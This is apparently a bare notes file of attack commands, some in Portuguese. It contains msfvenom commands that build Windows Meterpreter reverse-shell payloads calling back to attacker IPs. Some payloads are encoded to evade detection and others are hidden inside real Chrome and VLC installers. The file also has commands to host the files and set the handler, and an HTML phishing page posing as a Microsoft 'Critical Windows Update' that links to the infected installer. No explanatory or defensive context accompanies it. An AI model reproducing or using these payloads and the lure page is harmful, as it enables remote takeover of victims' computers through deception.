msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.137 LPORT=443 -f exe -x ChromeSetup.exe -o chrome_infectado.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<seu_ip> LPORT=443 -f exe -x vlc_setup.exe -o vlc_infectado.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

http://192.168.1.137:8080/vlc_infectado.exe


wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup.exe

set PAYLOAD windows/x64/meterpreter/reverse_https

http://192.168.1.137/payloads/relatorio_seguranca.exe


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows Update Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f7fa;
            text-align: center;
            padding-top: 100px;
        }
        h1 {
            color: #0078d4;
            font-size: 36px;
        }
        p {
            font-size: 18px;
            margin: 20px 0;
        }
        a.button {
            background-color: #0078d4;
            color: white;
            padding: 15px 30px;
            text-decoration: none;
            font-size: 20px;
            border-radius: 5px;
            display: inline-block;
            margin-top: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        a.button:hover {
            background-color: #005ea2;
        }
        footer {
            margin-top: 60px;
            color: gray;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <h1>Critical Windows Update Available</h1>
    <p>To keep your system protected and up-to-date, please download and install the latest update now.</p>
    <a href="vlc_infectado.exe" class="button">Download Update</a>
    <footer>Microsoft Update Service - © 2025</footer>
</body>
</html>


